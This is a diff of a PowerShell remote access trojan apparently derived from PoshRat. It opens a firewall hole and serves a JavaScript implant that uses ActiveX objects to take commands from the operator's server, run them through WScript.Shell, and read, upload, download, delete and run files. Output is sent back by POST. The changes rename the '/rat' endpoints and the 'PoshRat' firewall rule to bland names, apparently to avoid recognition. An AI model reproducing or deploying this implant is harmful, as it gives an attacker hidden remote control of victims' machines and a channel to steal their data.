@@ -21,8 +21,8 @@ function Receive-Request
 $listener = New-Object System.Net.HttpListener
 $listener.Prefixes.Add('http://+:80/') 
 
-netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
-netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
+netsh advfirewall firewall delete rule name="JS 80" | Out-Null
+netsh advfirewall firewall add rule name="JS 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
 
 $listener.Start()
 'Listening ...'
@@ -34,7 +34,7 @@ while ($true)
 	$hostip = $request.RemoteEndPoint
 
 	
-	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
+	if ($request.Url -match '/index$' -and ($request.HttpMethod -eq "GET")) 
 	{  
      		write-host "Usage:" -fore Green
 		write-host "      cmd:          	just input the cmd command" -fore Green
@@ -53,7 +53,7 @@ while ($true)
 						
                         	try
                         	{
-					h.Open("GET","http://'+$Server+'/rat",false);
+					h.Open("GET","http://'+$Server+'/get",false);
 					h.Send();
 					c = h.ResponseText;
                             
@@ -62,11 +62,11 @@ while ($true)
                             		{
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Next Input should be the File to Delete]");
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://'+$Server+'/rat",false);
+                                		g.Open("GET","http://'+$Server+'/get",false);
 					    	g.Send();
 					    	d = g.ResponseText;
 
@@ -76,7 +76,7 @@ while ($true)
                                 
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Delete Success]");
                                 		continue;                         
                             		}
@@ -85,12 +85,12 @@ while ($true)
                             		{
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Next Input should be the File to download]");
                                 
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://'+$Server+'/rat",false);
+                                		g.Open("GET","http://'+$Server+'/get",false);
 					    	g.Send();
 					    	d = g.ResponseText;
 
@@ -117,12 +117,12 @@ while ($true)
                             		{
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Next Input should be the File to Read]");
                                 
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://'+$Server+'/rat",false);
+                                		g.Open("GET","http://'+$Server+'/get",false);
 					    	g.Send();
 					    	d = g.ResponseText;
 
@@ -133,7 +133,7 @@ while ($true)
 
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send(g);
                                 		continue;
                             		}
@@ -143,19 +143,19 @@ while ($true)
                             		{
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Next Input should be the File to Run]");
                                 
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://'+$Server+'/rat",false);
+                                		g.Open("GET","http://'+$Server+'/get",false);
 					    	g.Send();
 					    	d = g.ResponseText;
 
                                 		r = new ActiveXObject("WScript.Shell").Run(d,0,true);
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
                                 		p.Send("[Run Success]");
                                 
                                 		continue;      
@@ -166,7 +166,7 @@ while ($true)
                             		{
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                         		 	p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Start to Upload]");
                                 
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -188,7 +188,7 @@ while ($true)
                                     
                                 		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		p.SetTimeouts(0, 0, 0, 0);
-					    	p.Open("POST","http://'+$Server+'/rat",false);
+					    	p.Open("POST","http://'+$Server+'/get",false);
 					    	p.Send("[Upload Success]");
                                 		continue;
                             		}
@@ -200,7 +200,7 @@ while ($true)
 				    		var so;
 				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 						    p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-				    		p.Open("POST","http://'+$Server+'/rat",false);
+				    		p.Open("POST","http://'+$Server+'/get",false);
 			 	       		p.Send(so);
                             		}
                             
@@ -209,7 +209,7 @@ while ($true)
                         	{
                             		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                             		p.SetTimeouts(0, 0, 0, 0);
-					p.Open("POST","http://'+$Server+'/rat",false);
+					p.Open("POST","http://'+$Server+'/get",false);
                             		p.Send("[No Output]");
                             
 				}
@@ -219,7 +219,7 @@ while ($true)
 
     	}		 
 	
-	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) 
+	if ($request.Url -match '/get$' -and ($request.HttpMethod -eq "POST") ) 
 	{ 
 		Receive-Request($request)	
 	}
@@ -241,7 +241,7 @@ while ($true)
        		write-host "Save Success" -fore Red
     	}
    
-    	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) 
+    	if ($request.Url -match '/get$' -and ($request.HttpMethod -eq "GET")) 
     	{  
         	$response.ContentType = 'text/plain'
         	$message = Read-Host "JS $hostip>"		
